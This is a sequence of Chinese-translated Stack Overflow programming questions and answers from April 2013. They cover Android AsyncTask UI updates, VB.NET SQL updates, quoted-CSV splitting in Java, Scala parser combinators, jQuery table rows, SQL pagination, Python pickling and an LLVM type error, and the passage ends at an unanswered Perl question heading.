> 时间：2013-04-01T06:47:00.197
> 
> 标签：android, android-asynctask, textview, google-maps-android-api-2

我想在 aynctask 中更新我的 textView，但它根本没有更新。我无法找出我的错误。

这是我的代码：

**注意： - 当我的应用失去焦点并重新获得焦点时，UI 会更新。奇怪的问题**

```
public class LocateGeopoint extends AsyncTask<LatLng, String, List<Address>> {

    Geocoder geocoder;
    private TextView tv;

    public LocateGeopoint(View v) {
        this.geocoder = new Geocoder(v.getContext());
        this.tv = (TextView) v.findViewById(R.id.textView1);
    }

    @Override
    protected void onPostExecute(List<Address> addresses) {
        super.onPostExecute(addresses);
        if(addresses!=null){
            String city = addresses.get(0).getAddressLine(0);
            String country = addresses.get(0).getAddressLine(1);
            System.out.println(city+"  "+country);

            tv.setText(city);

        }
    }

    @Override
    protected List<Address> doInBackground(LatLng... params) {
        // TODO Auto-generated method stub
        double lattitude = params[0].latitude;
        double longitude = params[0].longitude;

        List<Address> addresses = null;
        if (lattitude != 0 || longitude != 0) {

            try {
                addresses = geocoder.getFromLocation(lattitude, longitude, 1);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return addresses;
    }

} 
```

XML 文件（膨胀的一个）

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:id="@+id/parent_layout"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="horizontal" >

    <ImageView
        android:id="@+id/imageView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:src="@drawable/ic_launcher" />

    <FrameLayout
        android:id="@+id/view_container"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content" >

        <TextView
            android:id="@+id/textView1"
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:focusable="true"
           android:text="Loading Address.." />

    </FrameLayout> 
```

这是我从主要活动中调用 Asyntask 的方式

```
googleMap.setInfoWindowAdapter(new InfoWindowAdapter() {

            @Override
            public View getInfoWindow(Marker arg0) {
                return null;
            }

            @SuppressWarnings("unchecked")
            @Override
            public View getInfoContents(Marker marker) {
                LayoutInflater inflater = (LayoutInflater) MapsDemo.this
                        .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                View v =  inflater.inflate(R.layout.custom_info, null);
                new LocateGeopoint(v).execute(marker.getPosition());
                return v;
            }
        }); 
```

当我调试应用程序时，它会更新，但通常不会。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-09T22:43:37.697

将缓存添加到您的`InfoWindowAdapter`代码并修改其`getInfoContents()`方法以检查它：

```
 googleMap.setInfoWindowAdapter(new InfoWindowAdapter() {
        LruCache<Marker, View> cache = new LruCache<Marker, View>(8); // added

        // no change to getInfoWindow()

        @SuppressWarnings("unchecked")
        @Override
        public View getInfoContents(Marker marker) {
            View v = cache.get(marker);
            if (v == null) {
                LayoutInflater inflater = (LayoutInflater) MapsDemo.this
                        .getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                v =  inflater.inflate(R.layout.custom_info, null);
                new LocateGeopoint(v, marker).execute(marker.getPosition());
                cache.put(marker, v);
            }
            return v;
        }
    }); 
```

调整`LocateGeopoint`类中的代码，添加对 的引用并在更新 TextView 后`Marker`调用。`showInfoWindow()`

```
public class LocateGeopoint extends AsyncTask<LatLng, String, List<Address>> {

    // :
    Marker marker; // added

    public LocateGeopoint(View v, Marker marker) {
        // :
        this.marker = marker; // added
    }

    @Override
    protected void onPostExecute(List<Address> addresses) {
        super.onPostExecute(addresses);
        if(addresses!=null){
            // :
            tv.setText(city);
            marker.showInfoWindow(); // added
        }
    }

    // no change to doInBackground()
} 
```

注意：这个答案实际上只是一个快速而肮脏的实现（我还没有真正测试过，但我认为它应该可以工作）基于 MaciejGórski 对这个问题的回答，请阅读该答案中引用的帖子以获取更多详细信息： )

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-03T09:55:40.850

可以尝试调用 tv.invalidate() 希望它会工作

如果这不起作用

尝试在 onCreate 之外创建一个变量，例如 TextView 文本；然后在 onCreate 里面放： text = (TextView) findViewById(R.id.textView2);

然后放 text.setText(city); 在 onPostExecute 方法中。

看看这是否有效。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-03T19:59:07.720

如[文档中所述](https://developers.google.com/maps/documentation/android/marker#info_windows)，返回的视图不是实时视图，从 getInfoContents 返回后无法更新。

尝试遵循以下答案：[Maps V2 InfoWindow 中的动态内容](https://stackoverflow.com/questions/15503266/dynamic-contents-in-maps-v2-infowindow/15512984#15512984)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-04-09T14:18:22.873

试试这个：

```
runOnUiThread(new Runnable() {
                public void run() { 

                        try {
                            Thread.sleep(25);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                        tv.setText(city);
                }
            }); 
```

在仔细检查您的代码后：

```
@Override
protected void onPostExecute(List<Address> addresses) {
    super.onPostExecute(addresses);
    if(addresses!=null){
        String city = addresses.get(0).getAddressLine(0);
        String country = addresses.get(0).getAddressLine(1);
        System.out.println(city+"  "+country);

        tv.setText(city);

    }
} 
```

您已经覆盖了该`onPostExecute()`方法，为什么称它为超级函数？请删除`super.onPostExecute(addresses);`.

# sql - 无法在 VB.NET 中更新 SQL Server 表

> ID：15738909
> 
> 赞同：0
> 
> 时间：2013-04-01T06:47:17.773
> 
> 标签：sql, sql-server, vb.net, visual-studio-2002

使用 Visual Studio 2002 和 Microsoft SQL Server。我的代码没有产生错误，但 SQL Server 表仍然不受影响。:(

此代码的“添加”版本运行良好。. 这只是更新。T_T

```
 Private Sub btnSave_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSave.Click

    Try
        ''Open DBase
        dbOpen()
        Dim cmd As New SqlCommand()
        Dim cmdm As New SqlCommand()

        cmd.CommandText = "UPDATE [Currency] SET Country= @Country, Unit= @Unit , Code= @Code WHERE ISO= @ISO"

        Dim paramISO As New SqlParameter()
        paramISO.ParameterName() = "@ISO"
        paramISO.Value() = txtIso.Text
        cmd.Parameters.Add(paramISO)

        Dim paramCountry As New SqlParameter()
        paramCountry.ParameterName() = "@Country"
        paramCountry.Value() = txtCountry.Text
        cmd.Parameters.Add(paramCountry)

        Dim paramUnit As New SqlParameter()
        paramUnit.ParameterName() = "@Unit"
        paramUnit.Value() = txtUnit.Text
        cmd.Parameters.Add(paramUnit)

        Dim paramCode As New SqlParameter()
        paramCode.ParameterName() = "@Code"
        paramCode.Value() = txtCurrencyCode.Text
        cmd.Parameters.Add(paramCode)

        MessageBox.Show("Record Updated! ", "Update Status", MessageBoxButtons.OK, MessageBoxIcon.Information)

    Catch ex As Exception
        MessageBox.Show("Record Not Updated! ", "Update Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
    Finally
        dbClose()
        'refresh data grid
        fillgrid()
        'disable fields
        disControl()
    End Try
End Sub 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:49:07.767

你错过了这个声明：

```
cmd.ExecuteNonQuery() 
```

在将所有参数添加到 sqlCommand 对象后添加此语句。

# android - 我可以通过 SimpleCursorAdapter 添加自定义列表布局吗？

> ID：15738912
> 
> 赞同：0
> 
> 时间：2013-04-01T06:47:30.933
> 
> 标签：android, database, android-listview, simplecursoradapter

我是android新手..我正在学习使用数据库文件..我有一个`simplecurseadapter`这样的

```
Cursor c = db.query(TABLE_NAME,columns,null, null, null, null, COLUMN_ID);

            SimpleCursorAdapter adapter = new SimpleCursorAdapter(this, R.layout.list_item, c, 
                   new String[] {COLUMN_ID,COLUMN_NAME,COLUMN_order}, new int[] {R.id.list_item_text_id,R.id.list_item_text_main,R.id.list_item_text_sub}, 0);

        ListView list = (ListView) findViewById(R.id.list_poet_name);
        list.setAdapter(adapter); 
```

我想知道有没有办法制作自定义列表视图？我的 column_order 的值为 0,1，我希望显示值为 0 的行，`R.id.list_item_text_main`如果它的值为 1，则显示在`R.id.list_item_text_sub`我可以在中定义 if 语句`SimpleCursorAdapter`吗？是 怎么做？如果没有..最好的方法是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:54:21.780

像这样进行查询

```
Cursor c = db.query(TABLE_NAME,columns,COLUMN_order + "=? OR " + COLUMN_order + "=?", new String[]{"0", "1"}, null, null, COLUMN_ID);

SimpleCursorAdapter adapter = new SimpleCursorAdapter(this, R.layout.list_item, c, 
               new String[] {COLUMN_ID,COLUMN_NAME,COLUMN_order}, new int[] {R.id.list_item_text_id,R.id.list_item_text_main,R.id.list_item_text_sub}, 0);

    ListView list = (ListView) findViewById(R.id.list_poet_name);
    list.setAdapter(adapter); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:07:37.403

我想我找到了答案…… [http://enjoyandroid.wordpress.com/2012/03/12/customizing-simple-cursor-adapter/](http://enjoyandroid.wordpress.com/2012/03/12/customizing-simple-cursor-adapter/) 我正在努力……也许我错了

# java - 使用 String.split() 将带有引号的 csv 文件拆分为文本分隔符

> ID：15738918
> 
> 赞同：65
> 
> 时间：2013-04-01T06:48:03.717
> 
> 标签：java, csv, split

我有一个逗号分隔的文件，其中有许多行类似于下面的行。

```
Sachin,,M,"Maths,Science,English",Need to improve in these subjects. 
```

引号用于转义用于表示多个值的分隔符逗号。

现在，如果可能的话，如何在逗号分隔符上拆分上述值`String.split()`？

* * *

## 回答 #1

> 赞同：202
> 
> 时间：2013-04-01T07:00:54.447

```
public static void main(String[] args) {
    String s = "Sachin,,M,\"Maths,Science,English\",Need to improve in these subjects.";
    String[] splitted = s.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
    System.out.println(Arrays.toString(splitted));
} 
```

输出：

```
[Sachin, , M, "Maths,Science,English", Need to improve in these subjects.] 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2013-04-09T15:20:44.683

由于您的问题/要求并不那么复杂，因此可以使用自定义方法，该方法的执行速度提高 20 倍以上并产生相同的结果。这取决于数据大小和解析的行数，对于更复杂的问题，必须使用正则表达式。

```
import java.util.Arrays;
import java.util.ArrayList;
public class SplitTest {

public static void main(String[] args) {

    String s = "Sachin,,M,\"Maths,Science,English\",Need to improve in these subjects.";
    String[] splitted = null;

 //Measure Regular Expression
    long startTime = System.nanoTime();
    for(int i=0; i<10; i++)
    splitted = s.split(",(?=([^\"]*\"[^\"]*\")*[^\"]*$)");
    long endTime =   System.nanoTime();

    System.out.println("Took: " + (endTime-startTime));
    System.out.println(Arrays.toString(splitted));
    System.out.println("");

    ArrayList<String> sw = null;        
 //Measure Custom Method
            startTime = System.nanoTime();
    for(int i=0; i<10; i++)
    sw = customSplitSpecific(s);
    endTime =   System.nanoTime();

    System.out.println("Took: " + (endTime-startTime));
    System.out.println(sw);         
}

public static ArrayList<String> customSplitSpecific(String s)
{
    ArrayList<String> words = new ArrayList<String>();
    boolean notInsideComma = true;
    int start =0, end=0;
    for(int i=0; i<s.length()-1; i++)
    {
        if(s.charAt(i)==',' && notInsideComma)
        {
            words.add(s.substring(start,i));
            start = i+1;                
        }   
        else if(s.charAt(i)=='"')
        notInsideComma=!notInsideComma;
    }
    words.add(s.substring(start));
    return words;
} 
```

}

在我自己的计算机上，这会产生：

```
Took: 6651100
[Sachin, , M, "Maths,Science,English", Need to improve in these subjects.]

Took: 224179
[Sachin, , M, "Maths,Science,English", Need to improve in these subjects.] 
```

* * *

## 回答 #3

> 赞同：10
> 
> 时间：2013-04-01T06:57:53.743

如果您的字符串格式正确，则可以使用以下正则表达式：

```
String[] res = str.split(",(?=([^\"]|\"[^\"]*\")*$)"); 
```

该表达式确保仅在逗号后跟偶数（或零）个引号（因此不在此类引号内）发生拆分。

尽管如此，使用简单的非正则表达式解析器可能更容易。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2022-02-16T06:20:07.680

在处理 csv 字符串时，我们需要了解以下几点。

1.  行中的每个元组都将以“（引号）或不以”开头。a）如果以“（引号）开头，则它必须是特定列的值。b）如果它是直接开始的，那么它必须是标题。例如：'Header1,Header2,Header3,"value1","value2","value3"'; 这里 Header1,Header2,Header3 是列名，其余是值。

在进行拆分时我们需要记住的要点是您需要检查吐痰是否正确完成。a）获取拆分值并检查值中的引号数（计数必须为偶数） b）如果计数为奇数，则附加下一个拆分值。c) 重复过程 a,b 直到引号相等。

# gwt - Jboss Errai 上的 MVVM 模式

> ID：15738920
> 
> 赞同：0
> 
> 时间：2013-04-01T06:48:10.293
> 
> 标签：gwt, mvvm, jboss, errai

使用[Data Binding](https://docs.jboss.org/author/display/ERRAI/Errai+UI#ErraiUI-DataBinding)之类的功能，是否可以在[Jboss Errai](http://www.jboss.org/errai)上采用 MVVM 模式？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:56:07.843

MVVM 模式是一种设计模式，因此理论上可以将其与任何语言或 UI 框架一起使用。但是，如果框架支持数据绑定，MVVM 效果最好。使用与否是你的选择。

# parsing - Parser Combinators - 简单语法

> ID：15738922
> 
> 赞同：0
> 
> 时间：2013-04-01T06:48:24.893
> 
> 标签：parsing, scala, context-free-grammar, parser-combinators

我试图在我从书中复制的简单语法上使用 Scala 中的解析器组合器。当我运行以下代码时，它会在第一个令牌被错误解析后立即停止

`[1.3] failure: string matching regex '\z' expected but '+' found`

我明白为什么事情会出错。第一个标记是一个表达式，因此它是唯一需要根据语法进行解析的东西。但是我不知道什么是修复它的好方法。

```
object SimpleParser extends RegexParsers 
{
    def Name = """[a-zA-Z]+""".r
    def Int = """[0-9]+""".r

    def Main:Parser[Any] = Expr
    def Expr:Parser[Any] = 
    (
          Term
        | Term <~ "+" ~> Expr
        | Term <~ "-" ~> Expr
    )

    def Term:Parser[Any] = 
    (
          Factor
        | Factor <~ "*" ~> Term
    )

    def Factor:Parser[Any] =
    (
          Name
        | Int 
        | "-" ~> Int 
        | "(" ~> Expr <~ ")" 
        | "let" ~> Name <~ "=" ~> Expr <~ "in" ~> Expr <~ "end" 
    )

    def main(args: Array[String]) 
    {
        var input = "2 + 2"
        println(input)
        println(parseAll(Main, input))
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:15:08.047

`Factor <~ "*" ~> Term`意味着`Factor.<~("*" ~> Term)`，所以整个右边的部分都被删除了。使用`Factor ~ "*" ~ Term ^^ { case f ~ _ ~ t => ??? }`或`rep1sep`：

```
scala> :paste
// Entering paste mode (ctrl-D to finish)

import scala.util.parsing.combinator.RegexParsers

object SimpleParser extends RegexParsers
{
    def Name = """[a-zA-Z]+""".r
    def Int = """[0-9]+""".r

    def Main:Parser[Any] = Expr
    def Expr:Parser[Any] = rep1sep(Term, "+" | "-")

    def Term:Parser[Any] = rep1sep(Factor, "*")

    def Factor:Parser[Any] =
    (
          "let" ~> Name ~ "=" ~ Expr ~ "in" ~ Expr <~ "end" ^^ { case n ~ _ ~ e1 ~ _ ~ e2 => (n, e1, e2)
        | Int
        | "-" ~> Int
        | "(" ~> Expr <~ ")"
        | Name }
    )
}

SimpleParser.parseAll(SimpleParser.Main, "2 + 2")

// Exiting paste mode, now interpreting.

import scala.util.parsing.combinator.RegexParsers
defined module SimpleParser
res1: SimpleParser.ParseResult[Any] = [1.6] parsed: List(List(2), List(2)) 
```

解析器的第二部分`def Term:Parser[Any] = Factor | Factor <~ "*" ~> Term`是无用的。第一部分 ,`Factor`可以解析（非空`next`）`Input`第二部分 ,`Factor <~ "*" ~> Term`能够解析的任何内容。

# php - 为什么我没有范围访问 recursiveDirectoryItorator 中的值？

> ID：15738929
> 
> 赞同：0
> 
> 时间：2013-04-01T06:48:38.853
> 
> 标签：php, iterator, scope

我正在使用 PHP RecursiveDirectoryItorator，但我发现由于某种原因，我的一些变量应该在范围内时超出了范围......除非我真的错过了一些东西。我试图访问的两个变量是 $master_array 和 $current，如果我在 else 语句中 echo 或 print_r 它们都没有任何值。这是我的代码：

```
$master_array = array(); 

$startpath = "some file path"; // i'm using a real file path in my code. 
$ritit = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startpath), RecursiveIteratorIterator::CHILD_FIRST); 

foreach($ritit as $fileinfo) {
    echo "<pre>"; 
    $current = ''; 
    if(!$fileinfo->isFile()) {

        if(strip_replace($fileinfo->getFilename()) == strip_replace('some  - title')) {
            $master_array[$fileinfo->getFilename()]  = $fileinfo->getPathname(); 
            $current = $fileinfo->getFilename(); 
        } 

    } else {

        if(!empty($current) && in_array($current, split_file_path_into_array($fileinfo->getPathname()))) {
            echo $fileinfo->getFilename()."\n"; 
            echo $fileinfo->getPathname()."\n"; 
        } 
        echo $current; // i don't have access to this
        print_r($master_array); // and i don't have access to this.  

        }
    } 
```

对此的任何帮助将不胜感激。我希望我只是忽略了一些简单的事情，但我一直在查看这段代码，并且把它弄乱了很长一段时间，似乎无法让它工作。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T06:51:22.780

`$current`应该是数组而不是字符串

```
$current = array(); 
```

并且`$current`将始终为空，因为您在 else 内部调用它并在内部分配值`if's if`。

# jquery - 单击每行中存在的按钮时隐藏表格的行。在其他空表中显示同一行

> ID：15738936
> 
> 赞同：0
> 
> 时间：2013-04-01T06:49:08.830
> 
> 标签：jquery, html-table

我有两张桌子。一个表包含数据，另一个是空的。单击每一行中存在的特定字段时，我希望该行被隐藏并同时显示在空表中。

* * *

我使用的 Html 表具有这种类型结构：我希望行在单击时来回移动`<span>@<span>`

```
 <table class='table1' id='frm1'>
    <tr>
    <th>
    Name</th>
    <th>
    Address</th>
    <th>
    Amount
    </th>

    </tr>
    <tr id="one">
    <td><span class="s1">@</span>
    John

    </td>
    <td>
    California
    </td>

    <td>
    $4000</td>
        </tr>
    <tr id="two">
    <td><span class="s1">@</span>
    tedd
    </td>
    <td>
    California
    </td>

    <td>
    $4000</td>
        </tr>
    <tr id="three">
    <td><span class="s1">@</span>
    John

    </td>
    <td>
    florida
    </td>

    <td>
    $8000</td>
        </tr>
        </table>
    </div>
        <div class='text'></div>
    <div class='frm'>
    <table id='frm2'>
        </table> 
```

`

* * *

我使用的 jQuery 代码：

```
$('.s1').click(function(){$(this).closest('tr').clone().appendTo('#frm2').end().end().hide();});

$('.s1').click(function () {

$("frm2 tr").attr('id', function() {return $(this).attr('id')});
alert($("frm2 tr").attr('id'));
});/*tried to set the id's of table 1 as id's to table 2*/ 
```

我想来回移动行。我无法引用移动的行

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:58:52.967

这是可以实现您所描述的粗略代码

```
$('.particular_field').click(function(){
  $(this).closest('tr').clone().appendTo('#empty_table').end().end().hide();
}) 
```

**更新** 伴随的标记

```
 <table id="table1" border="1">
   <tr>
      <td>Value 1</td>
      <td>
         <input type="button" class="particular_field" value="click me" />
      </td>
   </tr>
   <tr>
      <td>Value 2</td>
      <td>
         <input type="button" class="particular_field" value="click me" />
      </td>
   </tr>
   <tr>
      <td>Value 3</td>
      <td>
         <input type="button" class="particular_field" value="click me" />
      </td>
   </tr>
   <tr>
      <td>Value 4</td>
      <td>
         <input type="button" class="particular_field" value="click me" />
      </td>
   </tr>
</table>

<table id="empty_table"></table> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T07:26:31.950

因此，如果您想单击表中的一行并将其放在另一个空表上，反之亦然，请检查以下示例：

[http://jsfiddle.net/nashio/MXKD3/1/](http://jsfiddle.net/nashio/MXKD3/1/)

```
$(function(){
$(document).on("click", "table tr", function(){
    if( $(this).closest("table").hasClass("table1") ) {
        $(".table2 tbody").prepend($(this));
    } else {
        $(".table1 tbody").prepend($(this));
    }
});
});

Table Source
<table class="table1">
<tbody>
<tr>
    <td>John</td><td>Doe</td>
</tr>
<tr>
    <td>Steve</td><td>Thomas</td>
</tr>
</tbody>
</table>

Table Target
<table class="table2">
<tbody>
</tbody>
</table> 
```

# android - 在android中旋转画布时图像被剪裁？

> ID：15738940
> 
> 赞同：3
> 
> 时间：2013-04-01T06:49:24.347
> 
> 标签：android, android-layout, bitmap, android-canvas, android-imageview

我正在开发一个应用程序，我在其中使用以下代码旋转图像。

```
Bitmap bmpOriginal = BitmapFactory.decodeResource(this.getResources(), R.drawable.image2); 
Bitmap bmResult = Bitmap.createBitmap(bmpOriginal.getWidth(), bmpOriginal.getHeight(), Bitmap.Config.ARGB_8888); 
    Canvas tempCanvas = new Canvas(bmResult); 
    tempCanvas.rotate(-10, bmpOriginal.getWidth()/2, bmpOriginal.getHeight()/2); 
tempCanvas.drawBitmap(bmpOriginal, 0, 0, null);

mImageView.setImageBitmap(bmResult); 
```

取自[Rotating a drawable in Android](https://stackoverflow.com/questions/4763103/rotating-a-drawable-in-android)

但是图像从边缘被剪裁，类似于[此](https://stackoverflow.com/questions/14399835/how-to-rotate-textview-without-clipping-its-bounds)

我已经搜索了互联网，但我无法解决它。我知道我必须增加 bmResult 的大小。我也尝试过这样做，但仍然有一些边缘被剪掉了。

如果任何机构可以给我线索或解决以下问题是我的 Imageview xml 代码

```
<ImageView
            android:id="@+id/img"
            android:layout_width="45dp"
            android:layout_height="45dp" >

</ImageView> 
```

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2015-03-20T03:16:08.500

对我有用的一种选择是将边距设置为负数：

```
 params.setMargins(-350, -350, -350, -350);
    final ImageView img1 = new ImageView(this);
    img1.setScaleType(ScaleType.FIT_CENTER);
    linearLayoutBackground.addView(img1, params); 
```

可能不是最佳实践，但它在紧要关头起到了作用。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-12T18:05:47.213

我遇到了同样的问题，这段代码对我有用。尝试一下。

```
Bitmap bmpOriginal = BitmapFactory.decodeResource(this.getResources(), R.drawable.image2); 
        Matrix mat = new Matrix();
        mat.postRotate(-10);
        Bitmap bMapRotate = Bitmap.createBitmap(bmpOriginal, 0, 0, bmpOriginal.getWidth(), bmpOriginal.getHeight(), mat, true);
        mImageView.setImageBitmap(bMapRotate); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-16T06:19:21.453

感谢@Alan 的回答我得到了解决方案，我只是在画布上的 (10,10) x,y 上旋转后绘制图像。

```
`tempCanvas.drawBitmap(bmpOriginal, 10, 10, null);` 
```

# php - 分页上的 SQL 内连接

> ID：15738944
> 
> 赞同：0
> 
> 时间：2013-04-01T06:49:54.410
> 
> 标签：php, sql

我有两个表 - 项目和订单。

```
Item  
=====================
ID, ItemName 

Order 
========================
orderID, ID , status 
```

我想通过使用 inner join 加入表：

```
SELECT Order.orderID, Order.ID, Item.ItemName
FROM Order
INNER JOIN Item
ON Order.ID=Item.ID 
```

但是我需要在php上进行分页的问题。

我有代码，但我不知道如何修改它，因为我的 sql 不是很好。

这是代码（我已经对其进行了修改并能够使用“*”显示，但不知道如何在下面的代码中应用内连接）：

```
SELECT TOP 20 * FROM 
(
SELECT  ROW_NUMBER() OVER (ORDER BY Order.orderID) AS RowNumber, *, TotalRows=Count(*) OVER()
FROM Order WHERE status=1
) _tmpInlineView
WHERE RowNumber >= 20 AND status=1 ORDER BY Order.orderID 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T07:04:21.323

将您的加入放在订单表下方：

```
SELECT TOP 20 * FROM 
(
SELECT  ROW_NUMBER() OVER (ORDER BY Order.orderID) AS RowNumber, Order.orderID, Order.ID, Item.ItemName, TotalRows=Count(*) OVER()
FROM Order INNER JOIN Item
ON Order.ID=Item.ID WHERE status=1
) _tmpInlineView
WHERE RowNumber >= 20 ORDER BY _tmpInlineView.orderID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T07:07:03.250

试试这个

```
 SELECT TOP 20 * FROM 
        (
        SELECT  ROW_NUMBER() OVER (ORDER BY Order.orderID) AS RowNumber, ORDER.*, 
Count(1) OVER() as TotalRows
        FROM ORDER INNER JOIN Item ON Order.ID=Item.ID
         WHERE status=1
        ) _tmpInlineView
        WHERE RowNumber >= 20 ORDER BY orderID 
```

或者试试这个

```
 SELECT * 
    FROM ORDER INNER JOIN Item ON Order.ID=Item.ID WHERE status=1
    ORDER BY Order.orderID 
    OFFSET ( @PageNo - 1 ) * @RecordsPerPage ROWS
    FETCH NEXT @RecordsPerPage ROWS ONLY

The following are the limitations of using Offset Fetch:
1) Fetch Next can't be used standalone, it requires Offset
2) Offset can't be used standalone, it requires order by
3) Top can't be combined with offset fetch next in the same query expression 
```

# c# - 使用 openid 的带有 ServiceStack 的 WPF 消费者

> ID：15738945
> 
> 赞同：2
> 
> 时间：2013-04-01T06:49:56.457
> 
> 标签：c#, .net, authentication, authorization, servicestack

我们有一个使用 openid 进行身份验证的 servicestack webservice，客户端是一个 wpf 应用程序，尝试使用 openid/oauth 并有问题

是否可以使用 oauth2 对 wpf 客户端进行身份验证，并使用身份验证令牌对 servicestack webservice 进行身份验证？

假设用户必须第一次使用 openid 登录网站，并且 openid/emailid/name 等将存储在网站本地，然后在 wpf 客户端使用时用于映射角色/授权？

这是正确的方法还是我可能把它搞混了？

寻找如何实现这一点的任何样本/示例

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-01T06:58:27.700

这种方法对我来说似乎是正确的，你可以使用这个库，用过一次，它非常好。

[http://www.dotnetopenauth.net/](http://www.dotnetopenauth.net/)

# python - 使用python将对象输出到文件

> ID：15738946
> 
> 赞同：2
> 
> 时间：2013-04-01T06:49:59.603
> 
> 标签：python, file-io

我想知道如何将类对象存储在文件中以便以后检索它。例如）我有一个堆栈类，我需要存储该类的对象以便稍后检索它。我尝试了以下方法：

```
output_file=open('hello.txt','w')
output_file.write(x) 
```

其中 x 是堆栈类的对象。整个堆栈程序运行良好，当我来到这个存储部分时，我得到一个错误：

```
Traceback (most recent call last):
File "class.py", line 32, in <module>
    output_file.write(x)
TypeError: expected a character buffer object 
```

我该如何纠正这个错误？最好的存储方式是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-01T06:51:46.297

最简单的是使用[`pickle`](http://docs.python.org/2/library/pickle.html)模块。

手册中有一些[例子](http://docs.python.org/2/library/pickle.html#example)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-01T06:54:40.713

按照建议使用`pickle`或将对象强制为 a `str`，这是所`write`期望的。

请注意，如果您决定强制转换为 a`str`并想要恢复该对象，则需要覆盖`__str__`您正在序列化的对象以输出足够的数据来重建该对象。

# ios - 没有可见的@interface 错误、UITableView 和 registerClass

> ID：15738950
> 
> 赞同：1
> 
> 时间：2013-04-01T06:50:23.463
> 
> 标签：ios, objective-c, xcode, uitableview

我是 Objective-C/Xcode 的新手，所以请耐心等待。

我正在尝试实现一个 TableView，其中每个单元格都包含另一个 View，类似于 Master-Detail 模板。我正在关注一本教从头开始做的书（换句话说，没有 Interface Builder）。

在我使用 viewDidLoad 方法之前，一切似乎都很顺利：

```
-(void)viewDidLoad
{
[super viewDidLoad];
} 
```

这本书告诉我在结束大括号之前插入这段代码：

```
[self.tableView registerClass:[UITableViewCell class] forCellReuseIdentifier:CellIdent]; 
```

连同一个静态变量，在@implementation 之前：

```
static NSString *CellIdent = @"Cell"; 
```

但是，这是我的问题：当我尝试键入“registerClass”时，UITableView 类似乎不包含该方法。我遵循了这个文档： http: [//developer.apple.com/library/ios/#documentation/UIKit/Reference/UITableView_Class/Reference/Reference.html#//apple_ref/occ/cl/UITableView](http://developer.apple.com/library/ios/#documentation/UIKit/Reference/UITableView_Class/Reference/Reference.html#//apple_ref/occ/cl/UITableView)说该方法确实是该类的一部分，但 Xcode 似乎无法识别它。我想知道这是否是语法问题，但我找不到任何不起作用的代码部分（我什至从其他教程中复制粘贴了同一行代码，以确保）。

如果我不得不猜测，我会说我以某种方式错误地实现了 UITableView 类，但我无法弄清楚问题所在。帮助？

抛出的确切错误是，“'UITableView' 没有可见的@interface 声明了选择器'registerClass：forCellReuseIdentifier'，这使我无法运行项目。虽然我全面搜索了这个错误，但似乎没有一个与问题有关我一直在吃。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-01T06:54:12.790

确保您使用的是最新版本的 Xcode 并针对 iOS 6.0 或更高版本 - 这是 iOS 6.0 中添加的一种方法

单击项目，然后在摘要下查找部署目标并检查版本号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-01T06:56:26.193

registerClass:forCellReuseIdentifier: 在 iOS 6.0 或更高版本中可用，可能您在应用程序中选择较早的 iOS 版本作为目标。

始终检查女巫 iOS 版本方法所属。

# llvm - 无效的 getelementptr 索引

> ID：15738951
> 
> 赞同：1
> 
> 时间：2013-04-01T06:50:26.683
> 
> 标签：llvm

我在这个 llvm-IR 代码的最后一行得到“无效的 getelementptr 索引”：

```
%alc = alloca %mytype*
store %mytype* %obj, %mytype** %alc
%ldc = load %mytype** %alc
%gcs = getelementptr inbounds %mytype* %ldc, i32 0, i32 1 
```

其中 mytype 定义如下：

```
%mytype = type {i32, %tp1**, %tp1} 
```

我有另一种类似的类型，对其进行索引不会导致上述错误，并定义为：

```
%mytype2 = type {i32, i16*, %tp1} 
```

任何解决此问题的帮助将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T07:37:35.740

该错误是由于`%mytype`未定义有效类型而引起的。通常 LLVM 会报告类型本身的错误，但如果类型定义出现在 getelementptr (GEP) 使用之后，那么您只会从 GEP 而不是类型中收到错误。

如果您将 的定义移动`%mytype`到 IR 文件中的 GEP 之前，您将看到更合适的错误消息。

在这种情况下，我猜问题是`%mytype`不完整的 - 要么`%tp1`缺少定义，要么缺少它使用的类型的定义（例如`%tp2`，我在你的评论中看到它使用的），或者类似的东西.

顺便说一句，您可能想使用我的[IR 编辑器](http://amishne.github.com/llvm-ir-editor/)，它可以帮助您快速找到这些类型的错误。

# perl - perl中的环境变量

> ID：15738957
> 
